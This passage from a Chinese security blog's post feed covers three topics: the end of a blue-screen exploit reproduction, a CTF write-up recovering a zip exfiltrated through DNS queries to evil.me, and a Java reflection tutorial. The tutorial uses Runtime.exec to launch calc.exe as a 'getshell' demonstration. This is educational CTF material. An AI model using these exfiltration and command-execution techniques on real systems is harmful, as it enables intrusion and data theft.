src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032222939.png" alt="image-20230403222207827"></p><p>然后我们使用 <code>exploit</code>执行：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032224871.png" alt="image-20230403222427772"></p><p>成功蓝屏</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝屏漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>闽盾杯初赛</title>
    <link href="/2023/08/24/%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <url>/2023/08/24/%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="【闽盾杯】wp"><a href="#【闽盾杯】wp" class="headerlink" title="【闽盾杯】wp"></a>【闽盾杯】wp</h2><h3 id="dns流量分析"><a href="#dns流量分析" class="headerlink" title="dns流量分析"></a>dns流量分析</h3><p><img src="https://s2.loli.net/2023/05/25/DXxNJClbOjfYuGa.png" alt="image-20230525121917826"></p><p>流量包里全是dns协议，但是观察一下请求包：</p><p><img src="https://s2.loli.net/2023/05/25/dnu9MlCYEVzecoI.png" alt="image-20230525122036977"></p><p>这里是zip压缩文件的16进制形式，我们使用<code>tshark</code>提取出来：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">tshark</span> -r flow.pcapng -<span class="hljs-type">T</span> fields -<span class="hljs-type">Y</span> <span class="hljs-string">&quot;dns.flags.response == 1&quot;</span> -e dns.qry.name &gt; <span class="hljs-class"><span class="hljs-keyword">data</span>.txt</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">504</span>b03041400090<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">008003</span>c1bee5204<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">212</span>ed6340000002<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">600000008000000</span><span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">666</span>c61672e74787<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">4</span>c6060a3144f6c4<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">9</span>c5bc8305e76f33<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">4670</span>b51c53ce58f<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br>f0eb452daa8cc63<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">07</span>fa2e2e4fad9c6<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">2587</span>a0a6e29c0e3<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">0</span>e71dc6505d2c24<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">504</span>b070804212ed<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">634000000260000</span><span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">00504</span>b01021f001<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">400090008003</span>c1b<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br>ee5204212ed6340<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">000002600000008</span><span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">002400000000000</span><span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">000200000000000</span><span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">0000666</span>c61672e7<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">478740</span>a00200000<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">000000010018005</span><span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">6</span>f63fe71c78d701<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">56</span>f63fe71c78d70<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">16</span>bd2d4340e78d7<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">01504</span>b050600000<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">000010001005</span>a00<span class="hljs-selector-class">.evil</span><span class="hljs-selector-class">.me</span><br><span class="hljs-number">00006</span>a000000000<span class="hljs-selector-class">.evil</span>.me<br></code></pre></td></tr></table></figure><p>然后写python脚本转为zip压缩包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/data.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/data.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>lines = f.readlines()<br>s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    line = line.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[:<span class="hljs-number">15</span>]<br>    s += line<br><br>s += <span class="hljs-string">&quot;0&quot;</span><br>fw.write(binascii.unhexlify(s))<br></code></pre></td></tr></table></figure><p>压缩包密码爆破一下，大小写得flag</p><p><img src="https://s2.loli.net/2023/05/25/gifBAmLW4xOXYnw.png" alt="image-20230525122305976"></p><h3 id="mylog"><a href="#mylog" class="headerlink" title="mylog"></a>mylog</h3><p><img src="https://s2.loli.net/2023/05/25/SZ2mFlXTQ8UfwGO.png" alt="image-20230525122424137"></p><p>这是一个mysql日志文件</p><p>我们使用strings命令过滤一下flag：</p><p><img src="https://s2.loli.net/2023/05/25/LXSegGUyCQTN76j.png" alt="image-20230525122506151"></p><p>找到了有关flag的操作，我们只需要拼接一下就行  , <code>year(now()) = 2023</code></p><p>flag{heidun_2023_heidun}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>闽盾杯初赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反射</title>
    <link href="/2023/08/24/%E5%8F%8D%E5%B0%84/"/>
    <url>/2023/08/24/%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="java安全-反射"><a href="#java安全-反射" class="headerlink" title="[java安全]反射"></a>[java安全]反射</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>在讲反射之前，我们需要知道什么是反射</p><blockquote><p>运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；<br>对于任意一个对象，都能够调用它的任意属性和方法；<br>这种动态获取信息以及动态调用对象方法的功能称为Java语言的反射机制。</p></blockquote><p>简单的说：反射是指在运行时动态地获取一个类的信息，包括其成员变量、方法和构造函数等，以及在运行时对它们进行操作的能力。</p><p>使用反射，你可以在编译时期并不知道某个类的具体类型，而在运行时期动态地创建该类的对象、调用该类的方法，或访问和修改该类的属性。这种能力使得Java具有了很高的灵活性和扩展性。</p><p>反射就像是一个工具箱，它提供了一系列方法来检查和操作类的信息，包括：</p><ul><li>获取一个类的相关信息，如名称、修饰符、继承关系等；</li><li>获取一个类的所有成员变量，并可以通过反射的方式修改它们的值；</li><li>获取一个类的所有方法，并可以通过反射的方式调用它们；</li><li>获取一个类的所有构造函数，并可以通过反射的方式创建它们的实例。</li><li>（包括私有属性）</li></ul><h3 id="反射的运用"><a href="#反射的运用" class="headerlink" title="反射的运用"></a>反射的运用</h3><h4 id="1、反射获取类对象"><a href="#1、反射获取类对象" class="headerlink" title="1、反射获取类对象"></a>1、反射获取类对象</h4><p>获取类对象主要有以下三种形式：</p><ul><li>Class.forName()</li><li>Object.class</li><li>obj.getClass()</li></ul><p>在我们获取了类对象后，我们就可以去使用类对象去获取类中的方法、成员变量、构造方法…了</p><h5 id="1-1、Class-forName"><a href="#1-1、Class-forName" class="headerlink" title="1.1、Class.forName()"></a>1.1、Class.forName()</h5><p>Class.forName(parameter)方法是Class类中的一个静态方法，直接通过Class调用，其中的参数传入一个类的全限定名（包名+类名）</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; runtime = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        System.out.println(runtime);<br>    &#125;<br>&#125;<br><br>输出：<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Runtime<br></code></pre></td></tr></table></figure><p>成功创建了一个Runtime的class类</p><h5 id="1-2、Object-class"><a href="#1-2、Object-class" class="headerlink" title="1.2、Object.class"></a>1.2、Object.class</h5><p>通过类的class属性直接获取类对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Class&lt;Runtime&gt; runtime = Runtime.class;<br>        System.out.println(runtime);<br>    &#125;<br>&#125;<br><br>输出：<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Runtime<br></code></pre></td></tr></table></figure><p>此处Runtime类处于 <code>java.lang</code>包下，所以不需要导包</p><h5 id="1-3、obj-getClass"><a href="#1-3、obj-getClass" class="headerlink" title="1.3、obj.getClass()"></a>1.3、obj.getClass()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>  &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Runtime</span>&gt; run = (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Runtime</span>&gt;) runtime.getClass();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先我们先创建<code>runtime</code>对象，然后调用对象的 <code>getClass()</code> 方法获取类对象</p><h4 id="2、反射获取成员方法"><a href="#2、反射获取成员方法" class="headerlink" title="2、反射获取成员方法"></a>2、反射获取成员方法</h4><ul><li>getMethods()</li><li>getDeclaredMethods()</li><li>getMethod(String functionName, Class&lt;?&gt;… parameterTypes)</li><li>getDeclaredMethod(String functionName, Class&lt;?&gt;… parameterTypes)</li></ul><h5 id="2-1、getMethods"><a href="#2-1、getMethods" class="headerlink" title="2.1、getMethods()"></a>2.1、getMethods()</h5><p>通过class类对象的<code>getMethods()</code>方法可以返回所有<strong>public</strong>公共成员方法(包括继承的)数组</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        Method[] methods = run.getMethods();<br>        <span class="hljs-keyword">for</span> (Method method : methods) &#123;<br>            System.out.println(method);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/28/MtPJQvfwlLZkIGR.png" alt="image-20230528163233262"></p><p>其中也包含了非Runtime类的成员方法</p><h5 id="2-2、getDeclaredMethods"><a href="#2-2、getDeclaredMethods" class="headerlink" title="2.2、getDeclaredMethods()"></a>2.2、getDeclaredMethods()</h5><p>通过class类对象的<code>getDeclaredMethods()</code>方法可以返回<strong>所有权限</strong>的成员方法(包括私有的、不包括继承的)数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        Method[] methods = run.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span> (Method method : methods) &#123;<br>            System.out.println(method);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/28/zcYbpHNw2qWXglR.png" alt="image-20230528163626019"></p><p>如图，所有方法都是Runtime类的，无继承方法，并且可以获得除public权限外的方法</p><h5 id="2-3、getMethod"><a href="#2-3、getMethod" class="headerlink" title="2.3、getMethod()"></a>2.3、getMethod()</h5><p>返回单个public公共成员方法对象（包括继承）</p><p><code>getMethod(String functionName, Class&lt;?&gt;... parameterTypes)</code></p><p>参数1：代表想要获取的函数名称</p><p>参数2~x：代表对应函数声明类型的字节码对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> run.getMethod(<span class="hljs-string">&quot;equals&quot;</span>, Object.class); <br><span class="hljs-comment">// 此处equals(Object name)的参数为string类型，所以需要传递Object.class字节码对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-4、getDeclaredMethod"><a href="#2-4、getDeclaredMethod" class="headerlink" title="2.4、getDeclaredMethod()"></a>2.4、getDeclaredMethod()</h5><p>返回单个任意权限成员方法对象（包括私有，不包括继承）</p><p><code>getDeclaredMethod(String functionName, Class&lt;?&gt;... parameterTypes)</code></p><p>参数1：代表想要获取的函数名称</p><p>参数2~x：代表对应函数声明类型的字节码对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> run.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3、反射获取构造方法"><a href="#3、反射获取构造方法" class="headerlink" title="3、反射获取构造方法"></a>3、反射获取构造方法</h4><ul><li>getConstructors()</li><li>getDeclaredConstructors()</li><li>getConstructor()</li><li>getDeclaredConstructor()</li></ul><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>Constructor&lt;?&gt;[] getConstructors()</td><td>返回所有公共构造方法对象的数组</td></tr><tr><td>Constructor&lt;?&gt;[] getDeclaredConstructors()</td><td>返回所有构造方法对象的数组</td></tr><tr><td>Constructor<T> getConstructor(Class&lt;?&gt;… parameterTypes)</td><td>返回单个公共构造方法对象</td></tr><tr><td>Constructor<T> getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)</td><td>返回单个构造方法对象</td></tr></tbody></table><p>后两个函数的参数都是构造方法的函数声明中形参的字节码文件，与上面类似</p><h4 id="4、反射创建对象"><a href="#4、反射创建对象" class="headerlink" title="4、反射创建对象"></a>4、反射创建对象</h4><h5 id="4-1、通过Constructor创建对象"><a href="#4-1、通过Constructor创建对象" class="headerlink" title="4.1、通过Constructor创建对象"></a>4.1、通过Constructor创建对象</h5><h6 id="方法介绍"><a href="#方法介绍" class="headerlink" title="方法介绍"></a>方法介绍</h6><ul><li>newInstance()  根据指定的构造方法创建对象</li><li>setAccessible()  设置为true,表示取消访问检查</li></ul><p>我们这里使用<code>getDeclaredConstructor()</code>先获取<code>Runtime</code>类的构造方法，然后使用Constructor对象的<code>newInstance(Object...initargs)</code>方法(括号中传入构造方法所需的值)创建对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        Constructor&lt;?&gt; constructor = run.getDeclaredConstructor();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        System.out.println(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这里报错了：</p><p><img src="https://s2.loli.net/2023/05/28/cNvo9DfUBeEHOxC.png" alt="image-20230528170640904"></p><p>我们进Runtime类看一下构造方法的权限：</p><p><img src="https://s2.loli.net/2023/05/28/ruxUaWnKwL8d7FS.png" alt="image-20230528170721782"></p><p>我们发现Runtime类的构造方法是private修饰的，私有的</p><blockquote><p>在反射中被private修饰的不能直接使用，需要使用<code>setAccessible(true)</code>取消访问检查，暴力反射</p></blockquote><p>因此，我们在创建对象之前，先使用<code>setAccessible(true)</code>取消访问检查，然后创建对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        Constructor&lt;?&gt; constructor = run.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        System.out.println(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/28/ZKluSn9H26xMGws.png" alt="image-20230528172256663"></p><p>成功创建对象</p><h5 id="4-2、通过Class类对象创建对象"><a href="#4-2、通过Class类对象创建对象" class="headerlink" title="4.2、通过Class类对象创建对象"></a>4.2、通过Class类对象创建对象</h5><p>在Class类对象中可以直接调用<code>newInstance()</code> 方法调用无参构造方法创建一个空参对象</p><p>但是这里不能调用<code>setAccessible()</code>方法访问private修饰的构造方法</p><p>因此，如果我们使用这种方法创建Runtime对象就会失败：</p><p><img src="https://s2.loli.net/2023/05/28/b4Mos6G7mRyFD9H.png" alt="image-20230528173022759"></p><p>但是我们可以使用Class类对象的<code>newInstance()</code>方法创建构造方法不为private的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> run.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5、反射调用成员方法"><a href="#5、反射调用成员方法" class="headerlink" title="5、反射调用成员方法"></a>5、反射调用成员方法</h4><ul><li><p>方法介绍</p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>Object invoke(Object obj, Object… args)</td><td>运行方法</td></tr></tbody></table><p>参数一: 用obj对象调用该方法</p><p>参数二: 调用方法的传递的参数(如果没有就不写)</p><p>返回值: 方法的返回值(如果没有就不写)</p></li></ul><p>在我们获取到Method对象后，我们就可以使用Method对象的 <code>invoke()</code>方法去调用函数了</p><h5 id="通过Runtime对象的exec方法去调用计算器"><a href="#通过Runtime对象的exec方法去调用计算器" class="headerlink" title="通过Runtime对象的exec方法去调用计算器"></a>通过Runtime对象的exec方法去调用计算器</h5><p>首先我们创建Runtime的Class类，然后获取构造方法创建Runtime对象、获取exec方法，最后调用exec方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; run = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        Constructor&lt;?&gt; constructor = run.getDeclaredConstructor();<br>        <span class="hljs-comment">//注意需要取消访问检查，因为Runtime的构造方法是私有的</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>); <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> run.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(runtime,<span class="hljs-string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器，getshell</p><p><img src="https://s2.loli.net/2023/05/28/EQmkzWDRCluniaK.png" alt="image-20230528174206005"></p><h4 id="6、反射获取成员变量并使用"><a href="#6、反射获取成员变量并使用" class="headerlink" title="6、反射获取成员变量并使用"></a>6、反射获取成员变量并使用</h4><p>方法分类</p><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td>Field[] getFields()</td><td>返回所有public公共成员变量对象的数组</td></tr><tr><td>Field[] getDeclaredFields()</td><td>返回所有成员变量对象的数组</td></tr><tr><td>Field getField(String name)</td><td>返回单个公共成员变量对象</td></tr><tr><td>Field getDeclaredField(String name)</td><td>返回单个成员变量对象</td></tr></tbody></table><p>用法和上面类似，参数名就是变量的名字。<code>getField()</code>和<code>getFields()</code> 都可以获取继承的属性</p><h5 id="6-1、获取成员变量的值"><a href="#6-1、获取成员变量的值" class="headerlink" title="6.1、获取成员变量的值"></a>6.1、获取成员变量的值</h5><ul><li>get()</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Teacher</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;stu&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reflect1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; stu = Class.forName(<span class="hljs-string">&quot;com.leekos.Student&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">newInstance</span> <span class="hljs-operator">=</span> stu.newInstance();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> stu.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        